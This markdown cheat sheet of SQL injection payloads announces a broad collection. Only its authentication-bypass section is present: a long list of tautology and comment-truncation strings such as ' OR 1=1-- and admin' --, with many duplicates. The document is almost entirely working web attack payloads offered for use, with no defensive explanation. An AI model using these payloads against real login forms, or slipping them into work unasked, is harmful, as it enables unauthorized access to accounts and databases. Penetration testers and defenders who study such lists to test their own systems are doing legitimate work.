# SQL Injection (SQLi) Payloads

> Complete collection of SQL injection payloads for database testing, authentication bypass, data extraction, and WAF evasion.

---

## 📋 Table of Contents
- [Authentication Bypass](#authentication-bypass)
- [Union-Based Payloads](#union-based-payloads)
- [Error-Based Payloads](#error-based-payloads)
- [Blind Boolean Payloads](#blind-boolean-payloads)
- [Time-Based Blind Payloads](#time-based-blind-payloads)
- [Stacked Queries](#stacked-queries)
- [Database Fingerprinting](#database-fingerprinting)
- [Data Extraction](#data-extraction)
- [WAF Bypass Techniques](#waf-bypass-techniques)
- [NoSQL Injection](#nosql-injection)
- [Second-Order SQLi](#second-order-sqli)
- [Out-of-Band (OOB) Payloads](#out-of-band-oob-payloads)
- [Database-Specific Payloads](#database-specific-payloads)
- [Advanced Bypasses](#advanced-bypasses)

---

## 🔐 Authentication Bypass

### Basic Bypass
```sql
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' /*
' OR 1=1--
' OR 1=1 --
' OR 1=1#
' OR 1=1 LIMIT 1--
'='OR'
admin' --
admin' -- -
admin' #
admin'/*
admin' OR '1'='1
admin' OR '1'='1'--
admin' OR '1'='1'/*
admin' OR 1=1--
admin' OR 1=1#
admin' OR 1=1/*
admin') OR ('1'='1
admin') OR ('1'='1'--
admin') OR ('1'='1'/*
admin') OR (1=1--
admin'-- -
' OR 1=1 --
' OR '1'='1' --
' OR '1'='1'/*
' OR '1'='1'#
' OR '1'='1' LIMIT 1
' OR 'x'='x
' OR 'x'='x'--
' OR 'x'='x'/*
' OR 'x'='x'#
' OR 1=1 LIMIT 1
'=' 'OR'
' OR ''='
' OR 1=1 --
' OR 1=1 --
' OR 1=1/*
' OR 1=1#
' OR 1=1 LIMIT 1
' OR 1=1 OFFSET 0
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
' OR '1'='1'#
' OR '1'='1' LIMIT 1
' OR '1'='1' OFFSET 0
" OR "1"="1
" OR "1"="1"--
" OR "1"="1"/*
" OR "1"="1"#
" OR 1=1--
" OR 1=1 --
" OR 1=1/*
" OR 1=1#
) OR '1'='1--
) OR '1'='1'--
) OR ('1'='1--
) OR (1=1--
```
